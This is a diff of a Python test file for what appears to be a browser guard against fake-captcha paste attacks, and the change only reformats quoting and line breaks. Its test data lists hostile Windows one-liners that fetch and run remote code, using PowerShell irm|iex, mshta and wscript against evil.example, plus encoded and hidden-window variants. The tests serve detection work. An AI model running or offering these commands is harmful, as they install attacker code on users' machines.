@@ -123,7 +123,7 @@ COMMANDS = [
     "powershell.exe -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
     "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA",
     r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep bypass -f x.ps1",
-    "pwsh -c \"irm https://evil.example | iex\"",
+    'pwsh -c "irm https://evil.example | iex"',
     "mshta https://evil.example/captcha.hta",
     'mshta vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""cmd /c x"":close")',
     "mshta.exe http://1.2.3.4/a",
@@ -145,7 +145,7 @@ COMMANDS = [
     "wscript //e:jscript http://evil.example/a.js",
     "conhost --headless powershell -c whoami",
     # The fake captcha dressing around the real command.
-    "cmd /c start /min powershell -w h -c \"iex(irm https://evil.example)\" "
+    'cmd /c start /min powershell -w h -c "iex(irm https://evil.example)" '
     "# I am not a robot - reCAPTCHA Verification ID: 6283",
     # The command on the second line, after padding.
     "\n\n   Verification ID: 1234\ncmd /c mshta https://evil.example/a\n",
@@ -340,7 +340,7 @@ class GuardMatchers(unittest.TestCase):
         for text in (
             "irm get.scoop.sh | iex",
             "iwr -useb https://deno.land/install.ps1 | iex",
-            "powershell -c \"irm https://bun.sh/install.ps1|iex\"",
+            'powershell -c "irm https://bun.sh/install.ps1|iex"',
         ):
             with self.subTest(text=text):
                 self.assertEqual(self.ask([f"cmd\t{hexed(text)}"])[0].strip(), "1")
@@ -348,8 +348,7 @@ class GuardMatchers(unittest.TestCase):
     def test_report_the_false_positive_count(self):
         """Prints how the matcher did, so a run shows the numbers."""
         found = sum(
-            a.strip() == "1"
-            for a in self.ask([f"cmd\t{hexed(t)}" for t in COMMANDS])
+            a.strip() == "1" for a in self.ask([f"cmd\t{hexed(t)}" for t in COMMANDS])
         )
         wrong = [
             t[:60]
@@ -421,7 +420,9 @@ class GuardWiring(unittest.TestCase):
             "guard_infobar.cc",
             "remote_access_tools.inc",
         ):
-            self.assertNotIn(chr(0x2014), text_of("components", "boring", "guards", name))
+            self.assertNotIn(
+                chr(0x2014), text_of("components", "boring", "guards", name)
+            )
 
 
 if __name__ == "__main__":
